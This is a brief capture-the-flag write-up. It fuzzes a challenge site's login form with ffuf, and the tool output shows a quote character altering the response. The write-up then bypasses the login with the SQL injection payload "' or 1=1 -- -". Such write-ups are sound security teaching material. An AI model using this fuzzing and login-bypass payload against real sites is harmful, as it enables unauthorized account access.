1. `ffuf` reveals that `'` can trigger different result.

```
$ ffuf -u 'http://ez.ctf.cafe:8888/login.php' -w /opt/SecLists/Fuzzing/special-chars.txt -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'name=abcdFUZZ&password=admin'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://ez.ctf.cafe:8888/login.php
 :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : name=abcdFUZZ&password=admin
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

|                       [Status: 200, Size: 1872, Words: 157, Lines: 54]
!                       [Status: 200, Size: 1872, Words: 157, Lines: 54]
.                       [Status: 200, Size: 1872, Words: 157, Lines: 54]
\                       [Status: 200, Size: 321, Words: 48, Lines: 2]
'                       [Status: 200, Size: 321, Words: 48, Lines: 2]
```

2. So we try some SQL injection `' or 1=1 -- -`.
3. Get flag.
